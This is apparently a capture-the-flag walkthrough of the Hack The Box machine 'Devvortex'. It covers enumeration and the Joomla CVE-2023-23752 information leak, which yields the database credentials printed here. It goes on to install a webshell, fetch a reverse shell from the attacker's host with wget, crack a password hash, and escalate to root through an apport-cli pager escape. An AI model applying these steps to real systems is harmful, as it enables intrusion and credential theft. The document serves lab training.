# Seasonal Machine devvortex easy machine

Firstly Copy the ip machine and fill it on /etc/hosts devvortex.htb

Secondly enumerate subdo with gobuster or fuzz for nmap i scanned but only 22 and 80 port opened

`gobuster vhost -u http://devvortex.htb/ -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -apppend-domain`

and you will got this subdomain dev.devvortex.htb and back again to /etc/hosts fill it
after that

Enumerate the files

gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/

/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]

this mean is this website use joomla because the folder name is administrator and second is /language

so how to exploit it to revshell?we enum again use gobuster again but add .txt like this
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/ -x .txt

/README.txt           (Status: 200) [Size: 4942]

got it
so copy the files go to subdo 
Joomla! CMS™

1- Overview
	* This is a Joomla! 4.x installation/upgrade package.
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
    Go to google search Joomla 4.2 Exploit
You will find this website https://github.com/Acceis/exploit-CVE-2023-23752
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git

cd Explot-xxxxx
gem install httpx docopt paint
bundle install

run 'ruby exploit.rb http://dev.devvortex.htb'

```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
                      
```

DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
go login http://dev.devvortex.htb/administrator copy db user and db paswd then paste it to form login

For Upload Shell Search on google joomla upload shell 
u will found this exploit 
https://github.com/p0dalirius/Joomla-webshell-plugin
Download as zip 
Go to "System --> Extensions" page, at http://127.0.0.1:10080/administrator/index.php?option=com_installer&view=install, and click on "Upload Package File":

upload .zip you downloaded it

Response:"Installation of the module was successful."


#Access Webshell 
http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php

i tried revshell use bash not work so i tried upload shell pentest monkey is work!

Open new terminal go to folder webshell and run python -m http.server 80

http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=wget -O /var/www/dev.devvortex.htb/c.php http://10.10.14.27/rev.php

```Output
"--2023-11-26 04:55:55--  http://10.10.14.27/rev.php\nConnecting to 10.10.14.27:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2585 (2.5K) [application/octet-stream]\nSaving to: '/var/www/dev.devvortex.htb/c.php'\n\n     0K ..                                                    100% 3.39M=0.001s\n\n2023-11-26 04:55:55 (3.39 MB/s) - '/var/www/dev.devvortex.htb/c.php' saved [2585/2585]\n\n"
```
Its Work Uploaded!!

http://dev.devvortex.htb/c.php
nc -lvnp 1337

nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.242] 33522
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 04:57:36 up  1:30,  2 users,  load average: 0.00, 0.03, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
logan    pts/0    10.10.16.2       03:28    1:14m  9.01s  0.03s sshd: logan [priv]  
logan    pts/3    10.10.16.11      03:53   31:03  18.99s  0.03s sshd: logan [priv]  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 

for login ssh you need login mysql u can use adminer or mysql command like this

do not forgot spawn tty shell python , because if you not spawn tty its now work 

mysql -u lewis -p joomla 

Enter password: 
P4ntherg0t1n5r3c0n##
mysql> use joomla;
show tables;
sd4fg_users

select * from sd4fg_users;
------------------------------------------------------------------------------------------
Username    Password
------------------------------------------------------------------------------------------
logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 

copy the password and hash it use john the ripper

ssh logan@dev.devvortex.htb 

Hashes password:tequieromucho

logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli



-c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)

sudo /usr/bin/apport-cli -c /bin/chfn less

for path anything you can use but do not forget add less 

Please choose (S/V/K/I/C):v

== ProcCpuinfoMinimal =================================
processor       : 1
vendor_id       : AuthenticAMD
cpu family      : 23
model           : 49
model name      : AMD EPYC 7302P 16-Core Processor
stepping        : 0
cpu MHz         : 2994.375
cache size      : 512 KB
physical id     : 2
siblings        : 1
core id         : 0
cpu cores       : 1
apicid          : 2
initial apicid  : 2
fpu             : yes
fpu_exception   : yes
cpuid level     : 16
!sh

# id
uid=0(root) gid=0(root) groups=0(root)

success :D

Happy Hacking 
